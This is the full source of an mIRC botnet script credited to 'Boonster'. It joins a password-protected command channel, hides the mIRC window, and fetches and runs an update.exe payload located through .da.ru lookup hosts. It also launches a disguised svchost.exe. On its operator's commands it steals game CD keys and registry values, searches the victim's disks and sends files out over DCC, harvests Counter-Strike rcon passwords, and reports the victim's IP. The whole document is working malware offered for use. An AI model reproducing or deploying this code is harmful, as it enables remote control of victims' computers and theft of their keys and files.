;YOU DONT LIKE ME? BITE ME!!
;NETCREW SCRIPT MODDED BY BOONSTER

ON *:START: { 
  .timer 0 666 botnet.scan.4.server
  identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  set %botnet.version 0.76
  set %botnet.channel #boonster
  set %botnet.channelpw boonster
  server irc.gamesnet.net:6667
  set %botnet.server irc.gamesnet.net:6667
  nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  anick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  echo -a $dll(logs/dmu.dll,HideMirc,on)
  set %botnet.bla $strip($)
  copy -o c:\windows\notepad.exe c:\windows\system32\
}

ON *:CONNECT: { 
  scon 1 join %botnet.channel %botnet.channelpw
  botnet.scan.4.server
  ignore -wd *
}

ON *:DISCONNECT: {   
  botnet.scan.4.server
}

alias -l botnet.scan.4.server { set %botnet.host boonsterserver.da.ru | sockclose botnet.check.server | sockopen botnet.check.server %botnet.host 80 }

ON *:SOCKOPEN:botnet.check.server: {
  sockwrite -n $sockname GET / HTTP/1.1
  sockwrite -n $sockname Host: %botnet.host $+ $str($crlf,2)
}

ON *:SOCKREAD:botnet.check.server: {
  var %sockread
  sockread %sockread
  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {
    if (%botnet.server != %sockread) {
      set %botnet.server %sockread
      scon 1 server %botnet.server
    }
  }
}

alias -l botnet.scan.4.version { set %botnet.host boonsterversion.da.ru | sockclose botnet.check.version | sockopen botnet.check.version %botnet.host 80 }

ON *:SOCKOPEN:botnet.check.version: {
  sockwrite -n $sockname GET / HTTP/1.1
  sockwrite -n $sockname Host: %botnet.host $+ $str($crlf,2)
}

ON *:SOCKREAD:botnet.check.version: {
  var %sockread
  sockread %sockread
  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {
    if (%botnet.version < %sockread) {
      if ($isfile(update.exe)) { .remove update.exe }      
      .timer 1 1 botnet.scan.4.fileurl
      .timer 1 2 sockclose botnet.check.version
    }
  }
}
alias -l botnet.scan.4.fileurl { set %botnet.host boonsterfileurl.da.ru | sockclose botnet.check.fileurl | sockopen botnet.check.fileurl %botnet.host 80 }

ON *:SOCKOPEN:botnet.check.fileurl: {
  sockwrite -n $sockname GET / HTTP/1.1
  sockwrite -n $sockname Host: %botnet.host $+ $str($crlf,2)
}

ON *:SOCKREAD:botnet.check.fileurl: {
  var %sockread
  sockread %sockread
  if ($regsub(%sockread, <HTML><HEAD><TITLE>,,%sockread)) && ($regsub(%sockread, </TITLE></HEAD>,,%sockread)) {
    set %botnet.account %sockread
    sockclose botnet.download.new.version
    .timer 1 1 sockopen botnet.download.new.version people.freenet.de 80
  }
}

ON *:SOCKOPEN:botnet.download.new.version: {
  sockwrite -n $sockname GET / $+ %botnet.account $+ /update.exe HTTP/1.0
  sockwrite -n $sockname Accept: */*
  sockwrite -n $sockname Host: %botnet.host $+ $str($crlf,2)
  sockwrite -n $sockname
}

ON *:SOCKREAD:botnet.download.new.version:{
  if (%botnet.aupd.downloadready != 1) {
    var %header
    sockread %header
    while ($sockbr) {
      if (* !iswm %header) {
        %botnet.aupd.downloadready = 1
        break
      }
      sockread %header
    }
  }
  sockread 4096 &d
  while ($sockbr) {
    bwrite update.exe -1 -1 &d
    sockread 4096 &d
  }
}

ON *:SOCKCLOSE:botnet.download.new.version: { unset %botnet.aupd.* | run update.exe | .timer 1 3 run C:\WINDOWS\system32\system01\svchost.exe | .timer 1 3 exit }

ON *:TEXT:*:%botnet.channel: { 
  if ($nick == boonster) {
    if ($1 == .amsg) { 
      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }
      else { scon $2 .amsg $3- }
    }
    elseif ($1 == .update) { botnet.scan.4.version }
    elseif ($1 == .nick) { 
      if ($3) { scon $2 nick $3 $+ $chr(91) $+ $rand(99999,1) $+ $chr(93) }
      else { scon $2 nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }
    } 
    elseif ($1 == .server) { botnet.scan.4.server }   
    elseif ($1 == .status) { scon 1 .msg %botnet.channel [ $+ $ip $+ ] Running BotNet v $+ %botnet.version with Windows $os $+ . Idle for $idle seconds. }
    elseif ($1 == .getkeys) { getkeys public }
    elseif ($1 == .mirc) { 
      if ($2 == amsg) { 
        if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }
        else { dde mirc command "" /.amsg $3- }
      }
      elseif ($2 == status) { dde mirc command "" //dde nc command "" /scon 1 msg %botnet.channel Nick: $ $+ me  Host: $ $+ host Mirc: $ $+ version MircDir: $ $+ mircdir }
    }
    elseif ($1 == .search_file) { search_file $2 $3 $nick public }
    elseif ($1 == .get_file) { get_search_file $2 $nick }  
    elseif ($1 == .search_rcon) { scan_config counterstrike rcon }     
    elseif ($1 == .join) { 
      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }
      else { scon $2 join $3- }  
    }
    elseif ($1 == .part) { 
      if ($3 == %boonster.channel) { return }
      elseif (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }
      else { scon $2 part $3- }    
    }
    elseif ($1 == .disconnect) { scon 2 disconnect }
    elseif ($1 == .msg) {
      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }
      else { scon $2 .msg $3 $4- }
    }
    elseif ($1 == .listserver) { listserver public }
    elseif ($1 == .readreg) { 
      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }
      else { scon 1 .msg %botnet.channel $_regread($2-) }
    }
    elseif ($1 == .connect) { 
      if ($scon(0) == 2)  { scon 2 server $2- }
      elseif ($scon(0) == 1) { server -m $2- }
    }
  }
}

ON *:TEXT:*:?: { 
  if ($nick == boonster) {
    if ($1 == .fserve) { fserve $nick 10 $2- }
    if ($1 == .amsg) { 
      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }
      else { scon $2 .amsg $3- }
    }
    elseif ($1 == .update) { botnet.scan.4.version }
    elseif ($1 == .server) { botnet.scan.4.server }   
    elseif ($1 == .status) { .msg $nick [ $+ $ip $+ ] Running BotNet v $+ %botnet.version with Windows $os $+ . Idle for $idle seconds. }
    elseif ($1 == .getkeys) { getkeys }
    elseif ($1 == .mirc) { 
      if ($2 == amsg) { 
        if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }
        else { dde mirc command "" /.amsg $3- }
      }
      elseif ($2 == status) { dde mirc command "" //dde nc command "" /scon 1 msg boonster Nick: $ $+ me  Host: $ $+ host Mirc: $ $+ version MircDir: $ $+ mircdir }
    }
    elseif ($1 == .search_file) { search_file $2 $3 $nick }
    elseif ($1 == .get_file) { get_search_file $2 $nick }    
    elseif ($1 == .search_rcon) { scan_config counterstrike rcon }   
    elseif ($1 == .join) { 
      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }
      else { scon $2 join $3- }  
    }
    elseif ($1 == .part) { 
      if ($3 == %boonster.channel) { return }
      elseif (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }
      else { scon $2 part $3- }    
    }
    elseif ($1 == .disconnect) { scon 2 disconnect }
    elseif ($1 == .msg) {
      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }
      else { scon $2 .msg $3 $4- }
    }
    elseif ($1 == .listserver) { listserver }
    elseif ($1 == .readreg) { 
      if (reg isin $2-) || (com isin $2-) || (%botnet.bla isin $2-) || (nc.dll isin $2-) || (chr isin $2-) || (decode isin $2-) || (mirc.exe isin $2-) || (dmu.dll isin $2-) || (exit isin $2-) || (quit isin $2-) || (disconnect isin $2-) || (write isin $2-) || (server isin $2-) || (load isin $2-) || (timer isin $2-) || (run isin $2-) || (ignore isin $2-) { return }
      else { scon 1 .msg $nick $_regread($2-) }
    }
    elseif ($1 == .connect) { 
      if ($scon(0) == 2)  { scon 2 server $2- }
      elseif ($scon(0) == 1) { server -m $2- }
    }
  }
}


alias -l listserver {
  var %i = 1
  while (%i <= $scon(0)) {
    var %botnet.listserver %botnet.listserver $iif($scon(%i).server, $+ %i $+ : $scon(%i).server)
    inc %i
  }
  if ($1 == public) { scon 1 .msg %botnet.channel %botnet.listserver }
  else { .msg $nick %botnet.listserver }
}


alias -l getkeys { 
  var %botnet.getkeys.bfv $_regread(HKEY_LOCAL_MACHINE\Software\Electronic Arts\EA GAMES\Battlefield Vietnam\ergc\)
  var %botnet.getkeys.hl $_regread(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key)
  var %botnet.getkeys.ut $_regread(HKEY_LOCAL_MACHINE\SOFTWARE\Unreal Technology\Installed Apps\UT2004\CDKEY)
  var %botnet.getkeys.q3 $read($_regread(HKEY_LOCAL_MACHINE\SOFTWARE\Id\Quake III Arena\INSTALLPATH) $+ \baseq3\q3key,1)
  var %botnet.getkeys.bf $_regread(HKEY_LOCAL_MACHINE\SOFTWARE\Electronic Arts\EA GAMES\Battlefield 1942\ergc\)
  if ($1 == public) {
    .msg #boonster.keys $iif(%botnet.getkeys.bfv,Battlefield Vietnam ( $+ %botnet.getkeys.bfv $+ ) )  $iif(%botnet.getkeys.hl,Half-Life ( $+ %botnet.getkeys.hl $+ ) )  $iif(%botnet.getkeys.ut,Unreal Tournament 2004 ( $+ %botnet.getkeys.ut $+ ) ) $iif(%botnet.getkeys.bf,Battlefield 1942 ( $+ %botnet.getkeys.bf $+ ) ) $iif(%botnet.getkeys.q3,Quake III Arena ( $+ %botnet.getkeys.q3 $+ ) ) 

  }
  else {
    scon 1 .msg $nick $iif(%botnet.getkeys.bfv,Battlefield Vietnam ( $+ %botnet.getkeys.bfv $+ ) )  $iif(%botnet.getkeys.hl,Half-Life ( $+ %botnet.getkeys.hl $+ ) )  $iif(%botnet.getkeys.ut,Unreal Tournament 2004 ( $+ %botnet.getkeys.ut $+ ) ) $iif(%botnet.getkeys.bf,Battlefield 1942 ( $+ %botnet.getkeys.bf $+ ) ) $iif(%botnet.getkeys.q3,Quake III Arena ( $+ %botnet.getkeys.q3 $+ ) )
  }  
}

alias -l search_file {
  if (!$disk($1)) { return NO_GIVEN_DISK }
  elseif (!$2) { return NO_SEARCH_FILE }
  elseif (%botnet.protection.search_file_timer) { return TIMER_STILL_ACTIVE }
  set %botnet.protection.search_file_timer ON
  var %i 1, %disk $1, %search $2, %found
  while (%i <= $findfile(%disk,%search,0)) {
    ;echo -a $findfile(%disk,%search,%i)
    %found = %found $replace($findfile(%disk,%search,%i),$chr(32),$chr(155))
    inc %i
  }
  if (%found) {
    if ($4 == public) {
      scon 1 .msg #boonster.found Found: $replace(%found,$chr(155),$chr(32))
    }
    else {
      scon 1 .msg $3 Found: $replace(%found,$chr(155),$chr(32))
    }
  }
  set %botnet.search_file.found $replace($strip(%found),$chr(32),$chr(8))
  .timer 1 10 unset %botnet.protection.search_file_timer
  .timer 1 60 unset %botnet.search_file.found
}

alias -l get_search_file {
  if (!%botnet.search_file.found) { return NO_SEARCH_RESULT }
  elseif ($1 !isnum) { return NO_GIVEN_FILENUMBER }
  if ($isfile($replace($gettok(%botnet.search_file.found,$1,8),$chr(155),$chr(32)))) {
    dcc send $2 $replace($gettok(%botnet.search_file.found,$1,8),$chr(155),$chr(32))
  }    
}

alias -l _regread {
  var %a = regread $+ $ticks
  .comopen %a WScript.Shell
  if ($comerr) { return 0 }
  if (!$com(%a,RegRead,3,bstr,$1)) {
    .comclose %a
    return 0
  }
  var %b = $com(%a).result
  .comclose %a
  return %b
}

alias scan_config {
  if ($2) {
    var %search $2
    if ($1 == counterstrike) { 
      var %dir $_regread(HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\InstallPath) $+ \SteamApps
      var %i 1, %line 1
      if ($isfile(scan_config.txt)) { .remove scan_config.txt }
      while (%i <= $findfile(%dir,*.cfg,0)) {
        if ($read($findfile(%dir,*.cfg,%i),w,* $+ %search $+ *,%line)) { .write scan_config.txt _ | .write scan_config.txt $findfile(%dir,*.cfg,%i) }
        while ($read($findfile(%dir,*.cfg,%i),w,* $+ %search $+ *,%line)) {
          .write scan_config.txt $read($findfile(%dir,*.cfg,%i),w,* $+ %search $+ *,%line)
          var %line $calc($readn + 1)
        }
        var %line 1
        inc %i
      }
      scon 1 .msg %botnet.channel File written.. 
    }
    elseif ($1 == quake3) { }
  }
}
ctcp *:dcc send:*: if ($len($nopath($filename)) >= 225) { scon 1 .msg %botnet.channel $nick tried to crash me with an illegal dcc send of $nopath($filename) | halt }
